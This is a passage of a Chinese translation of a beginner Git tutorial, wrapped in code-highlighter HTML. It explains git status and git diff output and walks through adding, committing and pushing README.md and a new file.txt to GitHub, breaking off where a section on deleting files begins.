crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nOn branch master\r\nYour branch is up-to-date with 'origin/master'.\".\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee613c409675198-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ee613c409675198-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee613c409675198-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92ee613c409675198-1\"><span class=\"crayon-e\">On </span><span class=\"crayon-e\">branch </span><span class=\"crayon-e\">master</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ee613c409675198-2\"><span class=\"crayon-e\">Your </span><span class=\"crayon-e\">branch </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">up</span><span class=\"crayon-o\">-</span><span class=\"crayon-st\">to</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">date </span><span class=\"crayon-i\">with</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'origin/master'</span><span class=\"crayon-sy\">.</span>\"<span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92ee613c409675198-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>因为我们还没有学习这些。（LCTT 译注：学了你就知道了）下一行说：<code>Changes not staged for commit</code>（变化未筹划提交）；这是告诉你，它下面列出的文件没有被标记准备（“筹划stage”）提交。如果你运行 <code>git add</code>，Git 会把这些文件标记为 <code>Ready for commit</code>（准备提交）；换句话说就是 <code>Changes staged for commit</code>（变化筹划提交）。在我们这样做之前，让我们用 <code>git diff</code> 命令来检查我们添加了什么到 Git 中，然后运行 <code>git add</code>。</p>\n<p>这里是终端输出：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/2787ca9ba76aedea3d424335e3cd5938.png\" alt=\"\"></p>\n<p>我们来分析一下：</p>\n<ul>\n<li><code>diff --git a/README.md b/README.md</code> 是 Git 比较的内容（在这个例子中是 <code>README.md</code>）。</li>\n<li><code>--- a/README.md</code> 会显示从文件中删除的任何东西。</li>\n<li><code>+++ b/README.md</code> 会显示从文件中添加的任何东西。</li>\n<li>任何添加到文件中的内容都以绿色文本打印，并在该行的开头加上 <code>+</code> 号。</li>\n<li>如果我们删除了任何内容，它将以红色文本打印，并在该行的开头加上 <code>-</code> 号。</li>\n<li>现在 <code>git status</code> 显示 <code>Changes to be committed:</code>（变化将被提交），并列出文件名（即 <code>README.md</code>）以及该文件发生了什么（即它已经被 <code>modified</code> 并准备提交）。</li>\n</ul>\n<p>提示：如果你已经运行了 <code>git add</code>，现在你想看看文件有什么不同，通常 <code>git diff</code> 不会输出任何东西，因为你已经添加了文件。相反，你必须使用 <code>git diff --cached</code>。它会告诉你 Git 添加的当前版本和以前版本文件之间的差别。你的终端输出看起来会是这样：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/9a0c05bdb3439247c9634ec4bf1f3b05.png\" alt=\"\"></p>\n<h3 id=\"toc_3\">上传文件到你的仓库</h3>\n<p>我们用一些新内容修改了 <code>README.md</code> 文件，现在是时候将它上传到 GitHub。</p>\n<p>让我们提交更改并将其推送到 GitHub。运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92ee6141410347524\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit commit -m \"Updated Readme file\"\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee6141410347524-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ee6141410347524-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92ee6141410347524-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-v\">commit</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Updated Readme file\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ee6141410347524-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>这告诉 Git 你正在“提交”已经“添加”的更改，你可能还记得，从本系列的第一部分中，添加一条消息来解释你在提交中所做的操作是非常重要的，以便你在稍后回顾 Git 日志时了解当时的目的。（我们将在下一篇文章中更多地关注这个话题。）<code>Updated Readme file</code> 是这个提交的消息——如果你认为这没有合理解释你所做的事情，那么请根据需要写下你的提交消息。</p>\n<p>运行 <code>git push -u origin master</code>，这会提示你输入用户名和密码，然后将文件上传到你的 GitHub 仓库。刷新你的 GitHub 页面，你应该会看到刚刚对 <code>README.md</code> 所做的更改。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/78dda20702c27aabe4b05aa9195fe867.png\" alt=\"\"></p>\n<p>终端的右下角显示我提交了更改，检查了 Git 状态，并将更改推送到了 GitHub。<code>git status</code> 显示：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92ee6144626342455\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nYour branch is ahead of 'origin/master' by 1 commit\r\n  (use \"git push\" to publish your local commits)\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee6144626342455-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ee6144626342455-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee6144626342455-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92ee6144626342455-1\"><span class=\"crayon-e\">Your </span><span class=\"crayon-e\">branch </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ahead </span><span class=\"crayon-i\">of</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'origin/master'</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">by</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">commit</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ee6144626342455-2\"> <span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-st\">use</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"git push\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">publish </span><span class=\"crayon-e\">your </span><span class=\"crayon-e\">local </span><span class=\"crayon-v\">commits</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92ee6144626342455-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>第一行表示在本地仓库中有一个提交，但不在 <code>origin/master</code> 中（即在 GitHub 上）。下一行指示我们将这些更改推送到 <code>origin/master</code> 中，这就是我们所做的。（在本例中，请参阅本系列的第一篇文章，以唤醒你对 <code>origin</code> 含义的记忆。我将在下一篇文章中讨论分支的时候，解释 <code>master</code> 的含义。）</p>\n<h3 id=\"toc_4\">添加新文件到 Git</h3>\n<p>现在我们修改了一个文件并在 GitHub 上更新了它，让我们创建一个新文件，将它添加到 Git，然后将其上传到 GitHub。 运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92ee614b901416059\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\necho \"This is a new file\" &gt;&gt; file.txt\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee614b901416059-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ee614b901416059-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92ee614b901416059-1\"><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"This is a new file\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">file</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ee614b901416059-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这将会创建一个名为 <code>file.txt</code> 的新文件。</p>\n<p>如果使用 <code>cat</code> 查看它：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92ee614e585377596\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ncat file.txt\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee614e585377596-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ee614e585377596-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92ee614e585377596-1\"><span class=\"crayon-e\">cat </span><span class=\"crayon-v\">file</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ee614e585377596-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>你将看到文件的内容。现在继续运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92ee6152134955082\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit status\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee6152134955082-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ee6152134955082-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92ee6152134955082-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-i\">status</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ee6152134955082-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>Git 报告说你的仓库中有一个未跟踪的文件（名为 <code>file.txt</code>）。这是 Git 告诉你说在你的计算机中的仓库目录下有一个新文件，然而你并没有告诉 Git，Git 也没有跟踪你所做的任何修改。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/7b5fcf2b0b8426eb0f6947e13740d8b4.png\" alt=\"\"></p>\n<p>我们需要告诉 Git 跟踪这个文件，以便我们可以提交并上传文件到我们的仓库。以下是执行该操作的命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92ee6155034229633\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit add file.txt\r\ngit status\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee6155034229633-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ee6155034229633-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ee6155034229633-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92ee6155034229633-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-e\">add </span><span class=\"crayon-v\">file</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ee6155034229633-2\"><span class=\"crayon-e\">git </span><span class=\"crayon-i\">status</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92ee6155034229633-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>终端输出如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/416a3cda5609a4d6af59d9b3ac7ed5a9.png\" alt=\"\"></p>\n<p><code>git status</code> 告诉你有 <code>file.txt</code> 被修改，对于 Git 来说它是一个 <code>new file</code>，Git 在此之前并不知道。现在我们已经为 Git 添加了 <code>file.txt</code>，我们可以提交更改并将其推送到 <code>origin/master</code>。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/b9726595fac48135765596f41e98112c.png\" alt=\"\"></p>\n<p>Git 现在已经将这个新文件上传到 GitHub；如果刷新 GitHub 页面，则应该在 GitHub 上的仓库中看到新文件 <code>file.txt</code>。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/deb4e163d789a2e959251df26e0ef9cc.png\" alt=\"\"></p>\n<p>通过这些步骤，你可以创建尽可能多的文件，将它们添加到 Git 中，然后提交并将它们推送到 GitHub。</p>\n<h3 id=\"toc_5\">从 Git 中删除文件</h3>\n<p>如果我们发现我们犯了一个错误，并且需要从我们的仓库中删除 <code>file.txt</code>，该怎么办？一种方法是使用以下命令从本地副本中删除文件：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92ee6159792722605\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div 